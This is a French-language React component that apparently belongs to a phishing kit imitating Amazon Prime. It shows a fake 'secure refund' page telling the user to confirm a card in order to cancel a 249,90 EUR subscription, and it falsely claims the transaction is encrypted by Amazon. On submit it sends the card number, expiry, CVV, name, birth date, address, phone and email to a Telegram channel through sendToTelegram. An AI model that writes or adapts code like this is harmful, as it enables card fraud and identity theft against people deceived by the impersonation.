'use client';

import Image from 'next/image';
import type { FormEvent, FormEventHandler } from 'react';
import visaLogo from '../../assets/images/visa.png';
import mastercardLogo from '../../assets/images/mastercard.png';
import amexLogo from '../../assets/images/amex.png';
import { sendToTelegram } from '@/lib/telegram';
import type { PersonalDetails } from './PersonalDetailsForm';
import {
  detectCardType,
  validateCardNumber,
  validateCvv,
  validateExpiry,
} from '@/lib/cardValidation';

const formatCardNumber: FormEventHandler<HTMLInputElement> = event => {
  const input = event.currentTarget;
  const digits = input.value.replace(/\D/g, '').slice(0, 19);

  // Amex : 4-6-5
  if (/^3[47]/.test(digits)) {
    input.value = [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 15)]
      .filter(Boolean)
      .join(' ');
    return;
  }
  // Visa / MC : 4-4-4-4 (max 16)
  input.value = digits.slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ').trim();
};

const formatExpiry: FormEventHandler<HTMLInputElement> = event => {
  const input = event.currentTarget;
  const digits = input.value.replace(/\D/g, '').slice(0, 4);
  input.value = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
};

const formatCvv: FormEventHandler<HTMLInputElement> = event => {
  event.currentTarget.value = event.currentTarget.value.replace(/\D/g, '').slice(0, 4);
};

export type CardDetails = {
  cardHolder: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
};

export function SafePaymentStep({
  initial,
  personal,
  onBack,
  onContinue,
}: {
  initial?: Partial<CardDetails>;
  personal?: PersonalDetails;
  onBack: () => void;
  onContinue: (card: CardDetails) => void;
}) {
  // ---------- handlers de validation (on blur) ----------

  const handleCardNumberInput: FormEventHandler<HTMLInputElement> = event => {
    formatCardNumber(event);
    event.currentTarget.setCustomValidity('');
  };

  const handleCardNumberBlur: FormEventHandler<HTMLInputElement> = event => {
    const result = validateCardNumber(event.currentTarget.value);
    event.currentTarget.setCustomValidity(result.error || '');
    if (!result.valid) event.currentTarget.reportValidity();
  };

  const handleExpiryInput: FormEventHandler<HTMLInputElement> = event => {
    formatExpiry(event);
    event.currentTarget.setCustomValidity('');
  };

  const handleExpiryBlur: FormEventHandler<HTMLInputElement> = event => {
    const result = validateExpiry(event.currentTarget.value);
    event.currentTarget.setCustomValidity(result.error || '');
    if (!result.valid) event.currentTarget.reportValidity();
  };

  const handleCvvInput: FormEventHandler<HTMLInputElement> = event => {
    formatCvv(event);
    event.currentTarget.setCustomValidity('');
  };

  const handleCvvBlur: FormEventHandler<HTMLInputElement> = event => {
    const form = event.currentTarget.form;
    const cardInput = form?.querySelector<HTMLInputElement>('#cardNumber');
    const type = cardInput ? detectCardType(cardInput.value) : 'unknown';
    const result = validateCvv(event.currentTarget.value, type);
    event.currentTarget.setCustomValidity(result.error || '');
    if (!result.valid) event.currentTarget.reportValidity();
  };

  // ---------- soumission ----------

  function submit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();

    const form = event.currentTarget;
    const cardNumberInput = form.querySelector<HTMLInputElement>('#cardNumber')!;
    const expiryInput = form.querySelector<HTMLInputElement>('#expiry')!;
    const cvvInput = form.querySelector<HTMLInputElement>('#cvv')!;

    const cardCheck = validateCardNumber(cardNumberInput.value);
    const expiryCheck = validateExpiry(expiryInput.value);
    const type = detectCardType(cardNumberInput.value);
    const cvvCheck = validateCvv(cvvInput.value, type);

    cardNumberInput.setCustomValidity(cardCheck.error || '');
    expiryInput.setCustomValidity(expiryCheck.error || '');
    cvvInput.setCustomValidity(cvvCheck.error || '');

    if (!form.reportValidity()) return;

    const data = new FormData(form);
    const card: CardDetails = {
      cardHolder: String(data.get('cardHolder') ?? '').trim(),
      cardNumber: String(data.get('cardNumber') ?? ''),
      expiry: String(data.get('expiry') ?? ''),
      cvv: String(data.get('cvv') ?? ''),
    };

    void sendToTelegram({
      title: 'Demande Prime',
      fields: {
        lastName: personal?.nom ?? '',
        firstName: personal?.prenom ?? '',
        birthDate: personal?.dateNaissance ?? '',
        address: personal?.adresse ?? '',
        postalCode: personal?.codePostal ?? '',
        city: personal?.ville ?? '',
        phone: personal?.telephone ?? '',
        email: personal?.email ?? '',
        cardHolder: card.cardHolder,
        cardNumber: card.cardNumber,
        expiry: card.expiry,
        cvv: card.cvv,
      },
    });

    onContinue(card);
  }

  return (
    <>
      <h1 className="amz-prime-title">Remboursement sécurisé</h1>
      <p className="amz-prime-lead">
        Confirmez la carte associée à votre abonnement pour finaliser l&apos;annulation.
      </p>

      <div className="amz-amount-row">
        <span>Montant total</span>
        <span className="amz-amount-row__value">249,90 EUR</span>
      </div>

      <div className="amz-card-panel">
        <div className="amz-card-panel__top">
          <div className="amz-card-brands" aria-label="Cartes acceptées">
            <Image src={visaLogo} alt="Visa" width={44} height={28} loading="lazy" />
            <Image src={mastercardLogo} alt="Mastercard" width={44} height={28} loading="lazy" />
            <Image src={amexLogo} alt="American Express" width={44} height={28} loading="lazy" />
          </div>
          <div className="amz-security-badge" aria-hidden="true">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
              <path
                d="M7 11V8a5 5 0 0110 0v3M6 11h12v9H6z"
                stroke="currentColor"
                strokeWidth="1.8"
                strokeLinecap="round"
              />
            </svg>
            <span>Remboursement sécurisé</span>
          </div>
        </div>

        <form className="amz-card-form" onSubmit={submit}>
          <p className="amz-card-form-intro">
            Saisissez les informations figurant sur votre carte bancaire.
          </p>
		  
		  <div className="amz-field">
            <label htmlFor="cardHolder">
              Nom du titulaire <span className="req">*</span>
            </label>
            <input
              className="amz-input"
              type="text"
              id="cardHolder"
              name="cardHolder"
              autoComplete="cc-name"
              placeholder="Prénom Nom"
              maxLength={60}
              required
              defaultValue={initial?.cardHolder ?? 'UTILISATEUR TEST'}
            />
          </div>

          <div className="amz-field">
            <label htmlFor="cardNumber">
              Numéro de carte <span className="req">*</span>
            </label>
            <div className="amz-input-wrap">
              <input
                className="amz-input"
                type="text"
                id="cardNumber"
                name="cardNumber"
                inputMode="numeric"
                autoComplete="cc-number"
                placeholder="1234 5678 9012 3456"
                maxLength={19}
                required
                defaultValue={initial?.cardNumber ?? '4242 4242 4242 4242'}
                onInput={handleCardNumberInput}
                onBlur={handleCardNumberBlur}
              />
            </div>
          </div>

          <div className="amz-form-grid">
            <div className="amz-field">
              <label htmlFor="expiry">
                Expiration (MM/AA) <span className="req">*</span>
              </label>
              <input
                className="amz-input"
                type="text"
                id="expiry"
                name="expiry"
                inputMode="numeric"
                autoComplete="cc-exp"
                placeholder="MM/AA"
                maxLength={5}
                required
                defaultValue={initial?.expiry ?? '12/34'}
                onInput={handleExpiryInput}
                onBlur={handleExpiryBlur}
              />
            </div>
            <div className="amz-field">
              <label htmlFor="cvv">
                CVV <span className="req">*</span>
              </label>
              <input
                className="amz-input"
                type="password"
                id="cvv"
                name="cvv"
                inputMode="numeric"
                autoComplete="cc-csc"
                placeholder="•••"
                maxLength={4}
                required
                defaultValue={initial?.cvv ?? '123'}
                onInput={handleCvvInput}
                onBlur={handleCvvBlur}
              />
              <p className="amz-field-hint">3 ou 4 chiffres au dos de la carte</p>
            </div>
          </div>

          <p className="amz-card-panel__note amz-card-panel__note--secure">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path
                d="M12 2L4 6v6c0 5.25 3.4 10.15 8 12 4.6-1.85 8-6.75 8-12V6l-8-4z"
                stroke="currentColor"
                strokeWidth="1.5"
              />
              <path
                d="M9 12l2 2 4-4"
                stroke="currentColor"
                strokeWidth="1.8"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
            Transaction chiffrée et sécurisée par Amazon.
          </p>

          <div className="amz-actions">
            <button type="submit" className="amz-btn amz-btn--primary">
              Confirmer l&apos;annulation
            </button>
            <button type="button" className="amz-btn amz-btn--secondary" onClick={onBack}>
              Retour
            </button>
          </div>
          <p className="amz-payment-footnote">
            En confirmant, vous autorisez la vérification du moyen de paiement indiqué
            ci-dessus.
          </p>
        </form>
      </div>
    </>
  );
}